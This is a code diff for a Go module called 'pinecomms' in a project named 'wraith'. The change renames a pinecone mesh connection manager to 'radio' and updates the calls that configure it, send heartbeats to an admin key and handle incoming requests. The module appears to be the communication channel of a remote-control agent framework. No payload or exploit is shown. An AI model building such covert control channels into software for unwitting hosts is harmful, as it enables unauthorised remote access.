@@ -14,8 +14,8 @@ import (
 	"sync"
 	"time"
 
-	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/pmanager"
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
+	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/radio"
 	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
 )
 
@@ -43,7 +43,7 @@ type ModulePinecomms struct {
 	StaticPeers  []string
 }
 
-func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pm pmanager.Manager, packet proto.Packet) {
+func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith, pr radio.Radio, packet proto.Packet) {
 
 	//
 	// Validate and process the packet.
@@ -130,7 +130,7 @@ func (m *ModulePinecomms) handleRequest(ctx context.Context, w *libwraith.Wraith
 		return
 	}
 
-	pm.Send(ctx, proto.Packet{
+	pr.Send(ctx, proto.Packet{
 		Peer:   packet.Peer,
 		Method: http.MethodPost,
 		Route:  proto.ROUTE_RESPONSE,
@@ -155,24 +155,24 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	}
 
 	// Get a struct for managing pinecone connections.
-	pm := pmanager.GetInstance()
+	pr := radio.GetInstance()
 
 	//
 	// Configure pinecone manager.
 	//
 
-	pm.SetPineconeIdentity(m.OwnPrivKey)
-	pm.SetInboundAddr(m.ListenTcp)
-	pm.SetWebserverAddr(m.ListenWs)
-	pm.SetUseMulticast(m.UseMulticast)
-	pm.SetStaticPeers(m.StaticPeers)
+	pr.SetPineconeIdentity(m.OwnPrivKey)
+	pr.SetInboundAddr(m.ListenTcp)
+	pr.SetWebserverAddr(m.ListenWs)
+	pr.SetUseMulticast(m.UseMulticast)
+	pr.SetStaticPeers(m.StaticPeers)
 
 	// Start the pinecone manager and make sure it stops when
 	// the module does.
 	defer func() {
-		pm.Stop()
+		pr.Stop()
 	}()
-	go pm.Start()
+	go pr.Start()
 
 	//
 	// Run the module.
@@ -226,7 +226,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				}
 
 				// Send the packet.
-				pm.Send(ctx, proto.Packet{
+				pr.Send(ctx, proto.Packet{
 					Peer:   hex.EncodeToString(m.AdminPubKey),
 					Method: http.MethodPost,
 					Route:  proto.ROUTE_HEARTBEAT,
@@ -239,7 +239,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Start receiving messages.
 	// Background context is okay because the channel will be closed
 	// when the manager exits further down anyway.
-	recv := pm.RecvChan(context.Background())
+	recv := pr.RecvChan(context.Background())
 
 	// Mainloop.
 	for {
@@ -252,7 +252,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 			switch packet.Route {
 			case proto.ROUTE_REQUEST:
 				// Launch a goroutine to handle the request and issue a response.
-				go m.handleRequest(ctx, w, pm, packet)
+				go m.handleRequest(ctx, w, pr, packet)
 			}
 		}
 	}
